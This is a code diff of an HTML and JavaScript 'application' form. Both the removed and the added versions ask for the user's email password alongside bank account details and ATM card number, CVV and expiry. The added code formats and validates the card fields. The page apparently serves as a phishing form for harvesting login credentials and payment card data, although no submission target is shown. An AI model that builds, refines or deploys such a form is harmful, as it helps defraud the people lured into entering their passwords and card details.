@@ -11,155 +11,134 @@
       padding: 20px;
     }
     form {
-      max-width: 500px;
-      margin: auto;
       background: #fff;
       padding: 20px;
       border-radius: 10px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     label {
       display: block;
       margin-top: 15px;
+      font-weight: bold;
     }
-    input, select {
+    input {
       width: 100%;
       padding: 10px;
+      font-size: 16px;
       margin-top: 5px;
       border: 1px solid #ccc;
       border-radius: 6px;
+      box-sizing: border-box;
     }
-    .hidden {
-      display: none;
+    .input-group {
+      position: relative;
+    }
+    .input-group input {
+      padding-right: 40px;
+    }
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 18px;
+      color: #888;
     }
     .error {
       color: red;
-      font-size: 0.9em;
+      font-size: 14px;
+      display: none;
       margin-top: 5px;
-    }
-    .password-toggle {
-      position: relative;
-    }
-    .password-toggle input {
-      padding-right: 40px;
-    }
-    .password-toggle span {
-      position: absolute;
-      right: 10px;
-      top: 38px;
-      cursor: pointer;
-      user-select: none;
-    }
-    .disabled-section {
-      pointer-events: none;
-      opacity: 0.5;
     }
   </style>
 </head>
 <body>
-  <form id="applicationForm" novalidate>
-    <label>Full Name
-      <input type="text" name="fullname" required />
-      <div class="error hidden">Full Name is required</div>
-    </label>
+  <form id="applicationForm">
+    <label for="cardNumber">ATM Card Number (16 digits):</label>
+    <input type="text" id="cardNumber" maxlength="19" placeholder="Enter 16-digit card number" required />
+    <div id="cardError" class="error">Card number must be 16 digits.</div>
 
-    <label>Country
-      <input type="text" name="country" required />
-      <div class="error hidden">Country is required</div>
-    </label>
+    <label for="expiry">Expiry Date (MM/YY):</label>
+    <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" required />
+    <div id="expiryError" class="error">Enter valid expiry (MM/YY).</div>
 
-    <label>Phone Number
-      <input type="tel" name="phone" pattern="\\d{9,12}" required />
-      <div class="error hidden">Phone number must be 9–12 digits</div>
-    </label>
-
-    <label>Email
-      <input type="email" name="email" required />
-      <div class="error hidden">Email is required</div>
-    </label>
-
-    <label>Email Password
-      <div class="password-toggle">
-        <input type="password" name="emailPassword" required id="emailPassword" />
-        <span onclick="togglePassword()">👁️</span>
-      </div>
-      <div class="error hidden">Password is required</div>
-    </label>
-
-    <label>Bank Account Type
-      <input type="text" name="accountType" placeholder="e.g. Standard Bank" required />
-      <div class="error hidden">Bank Account Type is required</div>
-    </label>
-
-    <label>Bank Account Number
-      <input type="text" name="accountNumber" required />
-      <div class="error hidden">Bank Account Number is required</div>
-    </label>
-
-    <label>Account Holder's Name
-      <input type="text" name="accountName" required />
-      <div class="error hidden">Account Holder’s Name is required</div>
-    </label>
-
-    <label>Did you link ATM card to your account?
-      <select id="atmLinked" required onchange="checkATMStatus()">
-        <option value="">Select</option>
-        <option value="yes">Yes</option>
-        <option value="no">No</option>
-      </select>
-      <div class="error hidden">Please select Yes or No</div>
-    </label>
-
-    <div id="atmWarning" class="error hidden">YOU MUST HAVE ATM CARD TO PROCEED</div>
-
-    <div id="atmSection">
-      <label>ATM Card Number
-        <input type="password" name="atmNumber" required />
-        <div class="error hidden">ATM Card Number is required</div>
-      </label>
-
-      <label>CVV
-        <input type="password" name="cvv" pattern="\\d{3}" required />
-        <div class="error hidden">CVV must be 3 digits</div>
-      </label>
-
-      <label>Expiry Date
-        <input type="text" name="expiry" placeholder="MM/YY" pattern="^(0[1-9]|1[0-2])/\\d{2}$" required />
-        <div class="error hidden">Enter a valid MM/YY expiry</div>
-      </label>
+    <label for="password">Email Password:</label>
+    <div class="input-group">
+      <input type="password" id="password" required />
+      <span class="toggle-password" onclick="togglePassword()">👁️</span>
     </div>
+
+    <!-- Add other fields as needed -->
 
     <button type="submit" style="margin-top: 20px;">Submit</button>
   </form>
 
   <script>
+    // Toggle password visibility
     function togglePassword() {
-      const passField = document.getElementById("emailPassword");
-      passField.type = passField.type === "password" ? "text" : "password";
+      const password = document.getElementById("password");
+      password.type = password.type === "password" ? "text" : "password";
     }
 
-    function checkATMStatus() {
-      const atmStatus = document.getElementById("atmLinked").value;
-      const atmWarning = document.getElementById("atmWarning");
-      const atmSection = document.getElementById("atmSection");
+    // Format card number live
+    const cardInput = document.getElementById("cardNumber");
+    cardInput.addEventListener("input", () => {
+      let value = cardInput.value.replace(/\D/g, "").substring(0, 16);
+      let formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ");
+      cardInput.value = formatted;
+    });
 
-      if (atmStatus === "no") {
-        atmWarning.classList.remove("hidden");
-        atmSection.classList.add("disabled-section");
-        Array.from(atmSection.querySelectorAll("input")).forEach(input => input.disabled = true);
+    // Format expiry as MM/YY
+    const expiryInput = document.getElementById("expiry");
+    expiryInput.addEventListener("input", () => {
+      let value = expiryInput.value.replace(/\D/g, "").substring(0, 4);
+      if (value.length >= 3) {
+        expiryInput.value = value.substring(0, 2) + '/' + value.substring(2);
       } else {
-        atmWarning.classList.add("hidden");
-        atmSection.classList.remove("disabled-section");
-        Array.from(atmSection.querySelectorAll("input")).forEach(input => input.disabled = false);
+        expiryInput.value = value;
       }
-    }
+    });
 
-    document.getElementById("applicationForm").addEventListener("input", function (e) {
-      const input = e.target;
-      const errorDiv = input.parentElement.querySelector(".error");
-      if (input.validity.valid) {
-        errorDiv?.classList.add("hidden");
+    // Validate on submit
+    document.getElementById("applicationForm").addEventListener("submit", function(e) {
+      const cardValue = cardInput.value.replace(/\s/g, "");
+      const expiryValue = expiryInput.value;
+
+      let valid = true;
+
+      // Card number check
+      if (cardValue.length !== 16) {
+        document.getElementById("cardError").style.display = "block";
+        valid = false;
       } else {
-        errorDiv?.classList.remove("hidden");
+        document.getElementById("cardError").style.display = "none";
+      }
+
+      // Expiry date validation
+      const expiryParts = expiryValue.split("/");
+      const month = parseInt(expiryParts[0], 10);
+      const year = parseInt("20" + expiryParts[1], 10);
+      const currentYear = new Date().getFullYear();
+      const currentMonth = new Date().getMonth() + 1;
+
+      if (
+        expiryParts.length !== 2 ||
+        isNaN(month) || isNaN(year) ||
+        month < 1 || month > 12 ||
+        year < currentYear ||
+        (year === currentYear && month < currentMonth)
+      ) {
+        document.getElementById("expiryError").style.display = "block";
+        valid = false;
+      } else {
+        document.getElementById("expiryError").style.display = "none";
+      }
+
+      if (!valid) {
+        e.preventDefault();
       }
     });
   </script>
